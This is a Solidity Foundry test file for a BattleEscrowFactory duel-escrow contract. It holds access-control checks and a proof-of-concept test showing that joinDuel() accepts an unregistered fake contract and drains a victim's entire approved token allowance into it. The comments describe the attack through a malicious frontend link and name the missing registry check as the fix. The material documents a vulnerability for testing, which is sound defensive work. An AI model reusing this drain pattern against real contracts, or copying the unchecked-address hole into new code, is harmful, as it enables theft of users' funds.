// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../../src/duel/BattleEscrow.sol";
import "../../src/duel/BattleEscrowFactory.sol";
import "./MockERC20.sol";

/// @dev Not a real BattleEscrow clone at all — never deployed by the factory, never
/// pushed onto `allDuels`. It only implements the two functions BattleEscrowFactory.joinDuel()
/// actually calls. Used to demonstrate that joinDuel() trusts whatever address it's given.
contract FakeDuel {
    address public token;
    uint256 public amount;

    constructor(address _token, uint256 _amount) {
        token = _token;
        amount = _amount;
    }

    function joinTerms() external view returns (address, uint256) {
        return (token, amount);
    }

    function activate(address) external {
        // no-op: always "succeeds", unlike a real BattleEscrow this has no state machine at all
    }
}

contract BattleEscrowFactoryAdversarialTest is Test {
    BattleEscrow implementation;
    BattleEscrowFactory factory;
    MockERC20 stakeToken;

    address oracleSigner = address(0xACE);
    address platformTreasury = address(0xFEE);
    address creator = address(0x1001);
    address victim = address(0x1002);
    address rando = address(0x1003);

    uint256 constant BUY_IN = 100e18;
    uint256 constant DURATION = 20 minutes;

    function setUp() public {
        implementation = new BattleEscrow();
        factory = new BattleEscrowFactory(address(implementation), oracleSigner, platformTreasury);
        stakeToken = new MockERC20();
    }

    // ==================== access control ====================

    function test_onlyOwnerCanSetOracleSigner() public {
        vm.prank(rando);
        vm.expectRevert(abi.encodeWithSignature("OwnableUnauthorizedAccount(address)", rando));
        factory.setOracleSigner(rando);
    }

    function test_onlyOwnerCanSetPlatformTreasury() public {
        vm.prank(rando);
        vm.expectRevert(abi.encodeWithSignature("OwnableUnauthorizedAccount(address)", rando));
        factory.setPlatformTreasury(rando);
    }

    function test_setOracleSignerRejectsZeroAddress() public {
        vm.expectRevert("bad signer");
        factory.setOracleSigner(address(0));
    }

    function test_setPlatformTreasuryRejectsZeroAddress() public {
        vm.expectRevert("bad treasury");
        factory.setPlatformTreasury(address(0));
    }

    function test_constructorRejectsZeroImplementation() public {
        vm.expectRevert("bad implementation");
        new BattleEscrowFactory(address(0), oracleSigner, platformTreasury);
    }

    function test_constructorRejectsZeroOracleSigner() public {
        vm.expectRevert("bad signer");
        new BattleEscrowFactory(address(implementation), address(0), platformTreasury);
    }

    function test_constructorRejectsZeroTreasury() public {
        vm.expectRevert("bad treasury");
        new BattleEscrowFactory(address(implementation), oracleSigner, address(0));
    }

    function test_createDuelRejectsBadCreatorSide() public {
        stakeToken.mint(creator, BUY_IN);
        vm.prank(creator);
        stakeToken.approve(address(factory), type(uint256).max);

        vm.prank(creator);
        vm.expectRevert("bad side");
        factory.createDuel(address(stakeToken), BUY_IN, 2, DURATION, "A", "B");
    }

    // ==================== KNOWN BUG ====================

    /// @dev BUG: BattleEscrowFactory.joinDuel(address duel) never checks that `duel` is
    /// actually one of its own clones (e.g. against `allDuels`). It blindly calls
    /// `joinTerms()` on whatever address it's handed, then `safeTransferFrom(msg.sender,
    /// duel, buyIn)` for whatever (token, amount) that address claims. Because the whole
    /// point of joinDuel/createDuel's UX is a one-time large/infinite ERC20 approval to the
    /// factory (this exact test suite's own setUp() pattern uses
    /// `approve(address(factory), type(uint256).max)`), any attacker can deploy a trivial
    /// contract that reports an arbitrary (stakeToken, buyIn) from joinTerms() and a no-op
    /// activate(), then get a victim (e.g. via a malicious frontend/link that calls
    /// `factory.joinDuel(attackerAddress)` instead of a real duel) to have their entire
    /// approved allowance pulled straight into the attacker's contract — with no duel ever
    /// created, no opponent match, no oracle signature, nothing.
    ///
    /// This is a genuine fund-drain vector, not a test gap. Left unfixed per task scope —
    /// the real fix is for joinDuel (and arguably cancelDuel/expireDuel) to require
    /// `duel` be a member of `allDuels` (e.g. via an `isDuel[address] => bool` mapping
    /// set in createDuel).
    function test_KNOWN_BUG_joinDuelPullsVictimFundsToAnUnregisteredFakeDuelAddress() public {
        uint256 approvedAllowance = 500e18;
        stakeToken.mint(victim, approvedAllowance);

        vm.prank(victim);
        stakeToken.approve(address(factory), approvedAllowance);

        // Attacker's contract was never created via factory.createDuel() and never
        // appears in factory.allDuels().
        FakeDuel fake = new FakeDuel(address(stakeToken), approvedAllowance);
        assertEq(factory.allDuelsLength(), 0);

        uint256 victimBalanceBefore = stakeToken.balanceOf(victim);

        vm.prank(victim);
        factory.joinDuel(address(fake));

        // The victim's entire approved allowance landed in the attacker's contract,
        // with zero legitimate duels ever having existed.
        assertEq(stakeToken.balanceOf(address(fake)), approvedAllowance);
        assertEq(stakeToken.balanceOf(victim), victimBalanceBefore - approvedAllowance);
        assertEq(factory.allDuelsLength(), 0);
    }
}
